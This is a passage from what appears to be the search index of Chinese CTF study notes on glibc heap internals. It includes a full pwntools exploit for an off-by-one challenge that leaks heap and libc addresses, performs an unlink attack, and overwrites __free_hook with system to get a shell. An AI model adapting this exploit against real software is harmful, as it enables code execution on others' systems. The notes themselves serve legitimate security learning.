\u5730\u5740\u88ab\u5199\u5728\u5806\u4e0a\uff0c\u4e4b\u540e\u4efb\u610f\u8bfb\u5c06\u5176\u8bfb\u51fa\u6765\u5373\u53ef\u3002 \u5176\u4e2d\u4e3a\u627e\u5230 libc \u6240\u5728\u7684\u504f\u79fb\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 gdb \u8c03\u8bd5\uff0c\u67e5\u770b\u5177\u4f53 libc \u5730\u5740\u5728\u5806\u4e0a\u7684\u4f4d\u7f6e\u5373\u53ef\uff0c\u4e0d\u7528\u8fdb\u884c\u523b\u610f\u8ba1\u7b97\u3002 exp \u5982\u4e0b\uff1a #! /usr/bin/env python2 # -*- coding: utf-8 -*- # vim:fenc=utf-8 import sys import os import os.path from pwn import * context(os='linux', arch='amd64', log_level='debug') if len(sys.argv) > 2: DEBUG = 0 HOST = sys.argv[1] PORT = int(sys.argv[2]) p = remote(HOST, PORT) else: DEBUG = 1 if len(sys.argv) == 2: PATH = sys.argv[1] p = process(PATH) def cmd(choice): p.recvuntil('> ') p.sendline(str(choice)) def create(book_size, book_name, desc_size, desc): cmd(1) p.recvuntil(': ') p.sendline(str(book_size)) p.recvuntil(': ') if len(book_name) == book_size: p.send(book_name) else: p.sendline(book_name) p.recvuntil(': ') p.sendline(str(desc_size)) p.recvuntil(': ') if len(desc) == desc_size: p.send(desc) else: p.sendline(desc) def remove(idx): cmd(2) p.recvuntil(': ') p.sendline(str(idx)) def edit(idx, desc): cmd(3) p.recvuntil(': ') p.sendline(str(idx)) p.recvuntil(': ') p.send(desc) def author_name(author): cmd(5) p.recvuntil(': ') p.send(author) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def main(): # Your exploit script goes here # leak heap address p.recvuntil('name: ') p.sendline('x' * (0x20 - 5) + 'leak:') create(0x20, 'tmp a', 0x20, 'b') # 1 cmd(4) p.recvuntil('Author: ') p.recvuntil('leak:') heap_leak = u64(p.recvline().strip().ljust(8, '\\x00')) p.info('heap leak @ 0x%x' % heap_leak) heap_base = heap_leak - 0x1080 create(0x20, 'buf 1', 0x20, 'desc buf') # 2 create(0x20, 'buf 2', 0x20, 'desc buf 2') # 3 remove(2) remove(3) ptr = heap_base + 0x1180 payload = p64(0) + p64(0x101) + p64(ptr - 0x18) + p64(ptr - 0x10) + '\\x00' * 0xe0 + p64(0x100) create(0x20, 'name', 0x108, 'overflow') # 4 create(0x20, 'name', 0x100 - 0x10, 'target') # 5 create(0x20, '/bin/sh\\x00', 0x200, 'to arbitrary read write') # 6 edit(4, payload) # overflow remove(5) # unlink edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + '\\n') def write_to(addr, content, size): edit(4, p64(addr) + p64(size + 0x100) + '\\n') edit(6, content + '\\n') def read_at(addr): edit(4, p64(addr) + '\\n') cmd(4) p.recvuntil('Description: ') p.recvuntil('Description: ') p.recvuntil('Description: ') content = p.recvline()[:-1] p.info(content) return content libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, '\\x00')) - 0x3c4b78 p.info('libc leak @ 0x%x' % libc_leak) write_to(libc_leak + libc.symbols['__free_hook'], p64(libc_leak + libc.symbols['system']), 0x10) remove(6) p.interactive() if __name__ == '__main__': main()","title":"\u7b80\u6d01\u65b9\u6848"},{"location":"glibc-heap/off_by_one/#ubuntu16","text":"book1 \u7ed3\u6784\u4f53\u8986\u76d6\u540e\u6307\u5411\u7684\u5730\u5740\u975e\u5e38\u4f4e\uff0c\u6307\u5411\u7684\u5730\u5740\u53d8\u6210\u662f\u5728\u4e00\u4e2a\u83ab\u540d\u5176\u5999\u7684 chunk \u91cc\u9762\u65e0\u6cd5\u5b9e\u73b0\u4f2a\u9020\u3002","title":"\u5728Ubuntu16\u4e0b\u51fa\u73b0\u60c5\u51b5"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/basic/","text":"\u57fa\u7840\u64cd\u4f5c \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55 unlink unlink \u7528\u6765\u5c06\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff08\u53ea\u5b58\u50a8\u7a7a\u95f2\u7684 chunk\uff09\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\u53d6\u51fa\u6765\uff0c\u53ef\u80fd\u5728\u4ee5\u4e0b\u5730\u65b9\u4f7f\u7528 malloc \u4ece\u6070\u597d\u5927\u5c0f\u5408\u9002\u7684 large bin \u4e2d\u83b7\u53d6 chunk\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f fastbin \u4e0e small bin \u5c31\u6ca1\u6709\u4f7f\u7528 unlink[^1]\uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6f0f\u6d1e\u4f1a\u7ecf\u5e38\u51fa\u73b0\u5728\u5b83\u4eec\u8fd9\u91cc\u7684\u539f\u56e0\u3002 [^1]:smallbin malloc \u6ca1\u6709 unlink free \u65f6\u4f1a\u6709\uff0c\u8be6\u7ec6\u770b\u56fe\u5bf9\u6bd4 largebin \u548c smallbin\uff0c\u56fe\u7247\u592a\u5927\uff0c\u653e\u56fe\u7247\u94fe\u63a5\uff1a head \u4f9d\u6b21 \u904d\u5386\u5904\u7406 unsorted bin \u65f6\u4e5f\u6ca1\u6709\u4f7f\u7528 unlink \u3002 \u4ece\u6bd4\u8bf7\u6c42\u7684 chunk \u6240\u5728\u7684 bin \u5927\u7684 bin \u4e2d\u53d6 chunk\u3002 free \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002 \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 malloc_consolidate \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002 \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 realloc \u524d\u5411\u6269\u5c55\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 \u7531\u4e8e unlink \u4f7f\u7528\u975e\u5e38\u9891\u7e41\uff0c\u6240\u4ee5 unlink \u88ab\u5b9e\u73b0\u4e3a\u4e86\u4e00\u4e2a\u5b8f\uff0c\u5982\u4e0b /* Take a chunk off a bin list */ // unlink p #define unlink(AV, P, BK, FD) { \\ // \u7531\u4e8e P \u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\"corrupted size vs. prev_size\"); \\ FD = P->fd; \\ BK = P->bk; \\ // \u9632\u6b62\u653b\u51fb\u8005\u7b80\u5355\u7be1\u6539\u7a7a\u95f2\u7684 chunk \u7684 fd \u4e0e bk \u6765\u5b9e\u73b0\u4efb\u610f\u5199\u7684\u6548\u679c\u3002 if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \\ else { \\ FD->bk = BK; \\ BK->fd = FD; \\ // \u4e0b\u9762\u4e3b\u8981\u8003\u8651 P \u5bf9\u5e94\u7684 nextsize \u53cc\u5411\u94fe\u8868\u7684\u4fee\u6539 if (!in_smallbin_range (chunksize_nomask (P)) \\ // \u5982\u679cP->fd_nextsize\u4e3a NULL\uff0c\u8868\u660e P \u672a\u63d2\u5165\u5230 nextsize \u94fe\u8868\u4e2d\u3002 // \u90a3\u4e48\u5176\u5b9e\u4e5f\u5c31\u6ca1\u6709\u5fc5\u8981\u5bf9 nextsize \u5b57\u6bb5\u8fdb\u884c\u4fee\u6539\u4e86\u3002 // \u8fd9\u91cc\u6ca1\u6709\u53bb\u5224\u65ad bk_nextsize \u5b57\u6bb5\uff0c\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898\u3002 && __builtin_expect (P->fd_nextsize != NULL, 0)) { \\ // \u7c7b\u4f3c\u4e8e\u5c0f\u7684 chunk \u7684\u68c0\u67e5\u601d\u8def if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0) \\ || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \"corrupted double-linked list (not small)\", \\ P, AV); \\ // \u8fd9\u91cc\u8bf4\u660e P \u5df2\u7ecf\u5728 nextsize \u94fe\u8868\u4e2d\u4e86\u3002 // \u5982\u679c FD \u6ca1\u6709\u5728 nextsize \u94fe\u8868\u4e2d if (FD->fd_nextsize == NULL) { \\ // \u5982\u679c nextsize \u4e32\u8d77\u6765\u7684\u53cc\u94fe\u8868\u53ea\u6709 P \u672c\u8eab\uff0c\u90a3\u5c31\u76f4\u63a5\u62ff\u8d70 P // \u4ee4 FD \u4e3a nextsize \u4e32\u8d77\u6765\u7684 if (P->fd_nextsize == P) \\ FD->fd_nextsize = FD->bk_nextsize = FD; \\ else { \\ // \u5426\u5219\u6211\u4eec\u9700\u8981\u5c06 FD \u63d2\u5165\u5230 nextsize \u5f62\u6210\u7684\u53cc\u94fe\u8868\u4e2d FD->fd_nextsize = P->fd_nextsize; \\ FD->bk_nextsize = P->bk_nextsize; \\ P->fd_nextsize->bk_nextsize = FD; \\ P->bk_nextsize->fd_nextsize = FD; \\ } \\ } else { \\ // \u5982\u679c\u5728\u7684\u8bdd\uff0c\u76f4\u63a5\u62ff\u8d70\u5373\u53ef P->fd_nextsize->bk_nextsize = P->bk_nextsize; \\ P->bk_nextsize->fd_nextsize = P->fd_nextsize; \\ } \\ } \\ } \\ } \u8fd9\u91cc\u6211\u4eec\u4ee5 small bin \u7684 unlink \u4e3a\u4f8b\u5b50\u4ecb\u7ecd\u4e00\u4e0b\u3002\u5bf9\u4e8e large bin \u7684 unlink\uff0c\u4e0e\u5176\u7c7b\u4f3c\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e2a nextsize \u7684\u5904\u7406\u3002 \u53ef\u4ee5\u770b\u51fa\uff0c P \u6700\u540e\u7684 fd \u548c bk \u6307\u9488\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316 \uff0c\u4f46\u662f\u5f53\u6211\u4eec\u53bb\u904d\u5386\u6574\u4e2a\u53cc\u5411\u94fe\u8868\u65f6\uff0c\u5df2\u7ecf\u904d\u5386\u4e0d\u5230\u5bf9\u5e94\u7684\u94fe\u8868\u4e86\u3002\u8fd9\u4e00\u70b9\u6ca1\u6709\u53d8\u5316\u8fd8\u662f\u5f88\u6709\u7528\u5904\u7684\uff0c\u56e0\u4e3a\u6211\u4eec\u6709\u65f6\u5019\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u6cc4\u6f0f\u5730\u5740 libc \u5730\u5740 P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cbk \u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cfd \u6cc4\u6f0f \u53cc\u5411\u94fe\u8868\u53ea\u5305\u542b\u4e00\u4e2a\u7a7a\u95f2 chunk \u65f6\uff0cP \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f \u6cc4\u6f0f\u5806\u5730\u5740\uff0c\u53cc\u5411\u94fe\u8868\u5305\u542b\u591a\u4e2a\u7a7a\u95f2 chunk P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cfd \u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cbk \u6cc4\u6f0f \u6ce8\u610f \u8fd9\u91cc\u7684\u5934\u90e8\u6307\u7684\u662f bin \u7684 fd \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u65b0\u52a0\u5165\u7684 chunk\u3002 \u8fd9\u91cc\u7684\u5c3e\u90e8\u6307\u7684\u662f bin \u7684 bk \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u5148\u52a0\u5165\u7684 chunk\u3002 \u540c\u65f6\uff0c\u65e0\u8bba\u662f\u5bf9\u4e8e fd\uff0cbk \u8fd8\u662f fd_nextsize \uff0cbk_nextsize\uff0c\u7a0b\u5e8f\u90fd\u4f1a\u68c0\u6d4b fd \u548c bk \u662f\u5426\u6ee1\u8db3\u5bf9\u5e94\u7684\u8981\u6c42\u3002 // fd bk if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \\ // next_size related if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0) \\ || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \"corrupted double-linked list (not small)\", \\ P, AV); \u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6b63\u5e38\u3002\u6211\u4eec\u4ee5 fd \u548c bk \u4e3a\u4f8b\uff0cP \u7684 forward chunk \u7684 bk \u5f88\u81ea\u7136\u662f P \uff0c\u540c\u6837 P \u7684 backward chunk \u7684 fd \u4e5f\u5f88\u81ea\u7136\u662f P \u3002\u5982\u679c\u6ca1\u6709\u505a\u76f8\u5e94\u7684\u68c0\u67e5\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 P \u7684 fd \u4e0e bk\uff0c\u4ece\u800c\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u3002\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53c2\u89c1\u5229\u7528\u90e8\u5206\u7684 unlink \u3002 \u6ce8\u610f\uff1a\u5806\u7684\u7b2c\u4e00\u4e2a chunk \u6240\u8bb0\u5f55\u7684 prev_inuse \u4f4d\u9ed8\u8ba4\u4e3a 1\u3002 malloc_printerr \u5728 glibc malloc \u65f6\u68c0\u6d4b\u5230\u9519\u8bef\u7684\u65f6\u5019\uff0c\u4f1a\u8c03\u7528 malloc_printerr \u51fd\u6570\u3002 static void malloc_printerr(const char *str) { __libc_message(do_abort, \"%s\\n\", str); __builtin_unreachable(); } \u4e3b\u8981\u4f1a\u8c03\u7528 __libc_message \u6765\u6267\u884c abort \u51fd\u6570\uff0c\u5982\u4e0b if ((action & do_abort)) { if ((action & do_backtrace)) BEFORE_ABORT(do_abort, written, fd); /* Kill the application. */ abort(); } \u5728 abort \u51fd\u6570\u91cc\uff0c\u5728 glibc \u8fd8\u662f 2.23 \u7248\u672c\u65f6\uff0c\u4f1a fflush stream\u3002 /* Flush all streams. We cannot close them now because the user might have registered a handler for SIGABRT. */ if (stage == 1) { ++stage; fflush (NULL); }","title":"\u5806\u57fa\u7840\u64cd\u4f5c"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/basic/#_1","text":"\u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55","title":"\u57fa\u7840\u64cd\u4f5c"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/basic/#unlink","text":"unlink \u7528\u6765\u5c06\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff08\u53ea\u5b58\u50a8\u7a7a\u95f2\u7684 chunk\uff09\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\u53d6\u51fa\u6765\uff0c\u53ef\u80fd\u5728\u4ee5\u4e0b\u5730\u65b9\u4f7f\u7528 malloc \u4ece\u6070\u597d\u5927\u5c0f\u5408\u9002\u7684 large bin \u4e2d\u83b7\u53d6 chunk\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f fastbin \u4e0e small bin \u5c31\u6ca1\u6709\u4f7f\u7528 unlink[^1]\uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6f0f\u6d1e\u4f1a\u7ecf\u5e38\u51fa\u73b0\u5728\u5b83\u4eec\u8fd9\u91cc\u7684\u539f\u56e0\u3002 [^1]:smallbin malloc \u6ca1\u6709 unlink free \u65f6\u4f1a\u6709\uff0c\u8be6\u7ec6\u770b\u56fe\u5bf9\u6bd4 largebin \u548c smallbin\uff0c\u56fe\u7247\u592a\u5927\uff0c\u653e\u56fe\u7247\u94fe\u63a5\uff1a head \u4f9d\u6b21 \u904d\u5386\u5904\u7406 unsorted bin \u65f6\u4e5f\u6ca1\u6709\u4f7f\u7528 unlink \u3002 \u4ece\u6bd4\u8bf7\u6c42\u7684 chunk \u6240\u5728\u7684 bin \u5927\u7684 bin \u4e2d\u53d6 chunk\u3002 free \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002 \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 malloc_consolidate \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002 \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 realloc \u524d\u5411\u6269\u5c55\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 \u7531\u4e8e unlink \u4f7f\u7528\u975e\u5e38\u9891\u7e41\uff0c\u6240\u4ee5 unlink \u88ab\u5b9e\u73b0\u4e3a\u4e86\u4e00\u4e2a\u5b8f\uff0c\u5982\u4e0b /* Take a chunk off a bin list */ // unlink p #define unlink(AV, P, BK, FD) { \\ // \u7531\u4e8e P \u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\"corrupted size vs. prev_size\"); \\ FD = P->fd; \\ BK = P->bk; \\ // \u9632\u6b62\u653b\u51fb\u8005\u7b80\u5355\u7be1\u6539\u7a7a\u95f2\u7684 chunk \u7684 fd \u4e0e bk \u6765\u5b9e\u73b0\u4efb\u610f\u5199\u7684\u6548\u679c\u3002 if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \\ else { \\ FD->bk = BK; \\ BK->fd = FD; \\ // \u4e0b\u9762\u4e3b\u8981\u8003\u8651 P \u5bf9\u5e94\u7684 nextsize \u53cc\u5411\u94fe\u8868\u7684\u4fee\u6539 if (!in_smallbin_range (chunksize_nomask (P)) \\ // \u5982\u679cP->fd_nextsize\u4e3a NULL\uff0c\u8868\u660e P \u672a\u63d2\u5165\u5230 nextsize \u94fe\u8868\u4e2d\u3002 // \u90a3\u4e48\u5176\u5b9e\u4e5f\u5c31\u6ca1\u6709\u5fc5\u8981\u5bf9 nextsize \u5b57\u6bb5\u8fdb\u884c\u4fee\u6539\u4e86\u3002 // \u8fd9\u91cc\u6ca1\u6709\u53bb\u5224\u65ad bk_nextsize \u5b57\u6bb5\uff0c\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898\u3002 && __builtin_expect (P->fd_nextsize != NULL, 0)) { \\ // \u7c7b\u4f3c\u4e8e\u5c0f\u7684 chunk \u7684\u68c0\u67e5\u601d\u8def if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0) \\ || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \"corrupted double-linked list (not small)\", \\ P, AV); \\ // \u8fd9\u91cc\u8bf4\u660e P \u5df2\u7ecf\u5728 nextsize \u94fe\u8868\u4e2d\u4e86\u3002 // \u5982\u679c FD \u6ca1\u6709\u5728 nextsize \u94fe\u8868\u4e2d if (FD->fd_nextsize == NULL) { \\ // \u5982\u679c nextsize \u4e32\u8d77\u6765\u7684\u53cc\u94fe\u8868\u53ea\u6709 P \u672c\u8eab\uff0c\u90a3\u5c31\u76f4\u63a5\u62ff\u8d70 P // \u4ee4 FD \u4e3a nextsize \u4e32\u8d77\u6765\u7684 if (P->fd_nextsize == P) \\ FD->fd_nextsize = FD->bk_nextsize = FD; \\ else { \\ // \u5426\u5219\u6211\u4eec\u9700\u8981\u5c06 FD \u63d2\u5165\u5230 nextsize \u5f62\u6210\u7684\u53cc\u94fe\u8868\u4e2d FD->fd_nextsize = P->fd_nextsize; \\ FD->bk_nextsize = P->bk_nextsize; \\ P->fd_nextsize->bk_nextsize = FD; \\ P->bk_nextsize->fd_nextsize = FD; \\ } \\ } else { \\ // \u5982\u679c\u5728\u7684\u8bdd\uff0c\u76f4\u63a5\u62ff\u8d70\u5373\u53ef P->fd_nextsize->bk_nextsize = P->bk_nextsize; \\ P->bk_nextsize->fd_nextsize = P->fd_nextsize; \\ } \\ } \\ } \\ } \u8fd9\u91cc\u6211\u4eec\u4ee5 small bin \u7684 unlink \u4e3a\u4f8b\u5b50\u4ecb\u7ecd\u4e00\u4e0b\u3002\u5bf9\u4e8e large bin \u7684 unlink\uff0c\u4e0e\u5176\u7c7b\u4f3c\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e2a nextsize \u7684\u5904\u7406\u3002 \u53ef\u4ee5\u770b\u51fa\uff0c P \u6700\u540e\u7684 fd \u548c bk \u6307\u9488\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316 \uff0c\u4f46\u662f\u5f53\u6211\u4eec\u53bb\u904d\u5386\u6574\u4e2a\u53cc\u5411\u94fe\u8868\u65f6\uff0c\u5df2\u7ecf\u904d\u5386\u4e0d\u5230\u5bf9\u5e94\u7684\u94fe\u8868\u4e86\u3002\u8fd9\u4e00\u70b9\u6ca1\u6709\u53d8\u5316\u8fd8\u662f\u5f88\u6709\u7528\u5904\u7684\uff0c\u56e0\u4e3a\u6211\u4eec\u6709\u65f6\u5019\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u6cc4\u6f0f\u5730\u5740 libc \u5730\u5740 P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cbk \u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cfd \u6cc4\u6f0f \u53cc\u5411\u94fe\u8868\u53ea\u5305\u542b\u4e00\u4e2a\u7a7a\u95f2 chunk \u65f6\uff0cP \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f \u6cc4\u6f0f\u5806\u5730\u5740\uff0c\u53cc\u5411\u94fe\u8868\u5305\u542b\u591a\u4e2a\u7a7a\u95f2 chunk P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cfd \u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cbk \u6cc4\u6f0f \u6ce8\u610f \u8fd9\u91cc\u7684\u5934\u90e8\u6307\u7684\u662f bin \u7684 fd \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u65b0\u52a0\u5165\u7684 chunk\u3002 \u8fd9\u91cc\u7684\u5c3e\u90e8\u6307\u7684\u662f bin \u7684 bk \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u5148\u52a0\u5165\u7684 chunk\u3002 \u540c\u65f6\uff0c\u65e0\u8bba\u662f\u5bf9\u4e8e fd\uff0cbk \u8fd8\u662f fd_nextsize \uff0cbk_nextsize\uff0c\u7a0b\u5e8f\u90fd\u4f1a\u68c0\u6d4b fd \u548c bk \u662f\u5426\u6ee1\u8db3\u5bf9\u5e94\u7684\u8981\u6c42\u3002 // fd bk if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \\ // next_size related if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0) \\ || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \"corrupted double-linked list (not small)\", \\ P, AV); \u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6b63\u5e38\u3002\u6211\u4eec\u4ee5 fd \u548c bk \u4e3a\u4f8b\uff0cP \u7684 forward chunk \u7684 bk \u5f88\u81ea\u7136\u662f P \uff0c\u540c\u6837 P \u7684 backward chunk \u7684 fd \u4e5f\u5f88\u81ea\u7136\u662f P \u3002\u5982\u679c\u6ca1\u6709\u505a\u76f8\u5e94\u7684\u68c0\u67e5\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 P \u7684 fd \u4e0e bk\uff0c\u4ece\u800c\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u3002\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53c2\u89c1\u5229\u7528\u90e8\u5206\u7684 unlink \u3002 \u6ce8\u610f\uff1a\u5806\u7684\u7b2c\u4e00\u4e2a chunk \u6240\u8bb0\u5f55\u7684 prev_inuse \u4f4d\u9ed8\u8ba4\u4e3a 1\u3002","title":"unlink"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/basic/#malloc_printerr","text":"\u5728 glibc malloc \u65f6\u68c0\u6d4b\u5230\u9519\u8bef\u7684\u65f6\u5019\uff0c\u4f1a\u8c03\u7528 malloc_printerr \u51fd\u6570\u3002 static void malloc_printerr(const char *str) { __libc_message(do_abort, \"%s\\n\", str); __builtin_unreachable(); } \u4e3b\u8981\u4f1a\u8c03\u7528 __libc_message \u6765\u6267\u884c abort \u51fd\u6570\uff0c\u5982\u4e0b if ((action & do_abort)) { if ((action & do_backtrace)) BEFORE_ABORT(do_abort, written, fd); /* Kill the application. */ abort(); } \u5728 abort \u51fd\u6570\u91cc\uff0c\u5728 glibc \u8fd8\u662f 2.23 \u7248\u672c\u65f6\uff0c\u4f1a fflush stream\u3002 /* Flush all streams. We cannot close them now because the user might have registered a handler for SIGABRT. */ if (stage == 1) { ++stage; fflush (NULL); }","title":"malloc_printerr"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/free/","text":"\u91ca\u653e\u5185\u5b58\u5757 Free Heap Memory \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55 __libc_free \u7c7b\u4f3c\u4e8e malloc\uff0cfree \u51fd\u6570\u4e5f\u6709\u4e00\u5c42\u5c01\u88c5\uff0c\u547d\u540d\u683c\u5f0f\u4e0e malloc \u57fa\u672c\u7c7b\u4f3c\u3002\u4ee3\u7801\u5982\u4e0b void __libc_free(void *mem) { mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ // \u5224\u65ad\u662f\u5426\u6709\u94a9\u5b50\u51fd\u6570 __free_hook void (*hook)(void *, const void *) = atomic_forced_read(__free_hook); if (__builtin_expect(hook != NULL, 0)) { //\u6267\u884chook\u51fd\u6570\u7136\u540e\u8fd4\u56de (*hook)(mem, RETURN_ADDRESS(0)); return; } // free NULL\u6ca1\u6709\u4f5c\u7528 if (mem == 0) /* free(0) has no effect */ return; // \u5c06mem\u8f6c\u6362\u4e3achunk\u72b6\u6001 p = mem2chunk(mem); // \u5982\u679c\u8be5\u5757\u5185\u5b58\u662fmmap\u5f97\u5230\u7684 if (chunk_is_mmapped(p)) /* release mmapped memory. */ { /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if (!mp_.no_dyn_threshold && chunksize_nomask(p) > mp_.mmap_threshold && chunksize_nomask(p) <= 